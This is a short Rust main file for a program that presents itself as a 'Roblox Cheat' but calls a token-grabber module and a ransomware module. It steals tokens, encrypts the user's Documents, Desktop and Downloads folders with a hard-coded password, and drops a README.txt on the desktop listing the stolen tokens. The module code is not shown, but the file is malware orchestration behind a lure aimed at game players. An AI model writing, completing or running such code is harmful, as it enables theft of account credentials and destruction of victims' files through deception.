mod token_grabber;
mod ransomware;

fn main() {
    println!("Loading Roblox Cheat...");
    
    let tokens = token_grabber::grab_tokens();
    
    let target_dirs = vec![
        dirs::document_dir().unwrap_or_default(),
        dirs::desktop_dir().unwrap_or_default(),
        dirs::download_dir().unwrap_or_default(),
    ];
    
    ransomware::encrypt_directories(&target_dirs, "roblox123");
    
    let note = format!("FILES ENCRYPTED\nPassword: roblox123\nTokens: {:?}", tokens);
    if let Some(desktop) = dirs::desktop_dir() {
        let _ = std::fs::write(desktop.join("README.txt"), note);
    }
    
    println!("Done.");
}
